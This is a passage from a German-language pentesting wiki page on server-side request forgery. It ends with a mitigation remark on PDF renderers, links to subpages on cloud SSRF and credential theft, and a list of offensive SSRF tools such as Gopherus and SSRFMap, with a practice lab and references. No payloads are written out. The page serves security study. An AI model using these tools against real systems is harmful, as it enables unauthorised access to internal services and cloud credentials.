Sicherheitsverantwortliche sollten externe URLs vor dem Rendern entfernen oder den Renderer in einer Netzwerk-Sandbox isolieren; bis dahin sollten PDF-Generatoren als blind SSRF-Proxies behandelt werden.

## Cloud-SSRF-Ausnutzung

Wenn Sie eine SSRF-Schwachstelle in einer Maschine finden, die in einer Cloud-Umgebung läuft, könnten Sie interessante Informationen über die Cloud-Umgebung und sogar Zugangsdaten erhalten:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF-anfällige Plattformen

Mehrere bekannte Plattformen enthalten oder enthielten SSRF-Schwachstellen. Prüfe sie hier:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool zum Aufspüren und Ausnutzen von SSRF-Schwachstellen

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Dieses Tool erzeugt Gopher-Payloads für:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ ist ein _Java RMI_-Schwachstellen-Scanner, der Angriffsoperationen für die meisten gängigen _Java RMI_-Schwachstellen unterstützt. Die meisten verfügbaren Operationen unterstützen die `--ssrf`-Option, um eine _SSRF_-payload für die gewünschte Operation zu generieren. Zusammen mit der `--gopher`-Option können direkt einsatzbereite _gopher_-Payloads erzeugt werden.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy ist ein multithreaded HTTP-Proxy-Server, der dazu entwickelt wurde, Client-HTTP-Traffic durch HTTP-Server zu tunneln, die für Server-Side Request Forgery (SSRF) verwundbar sind.

### Zum Üben


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Referenzen

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
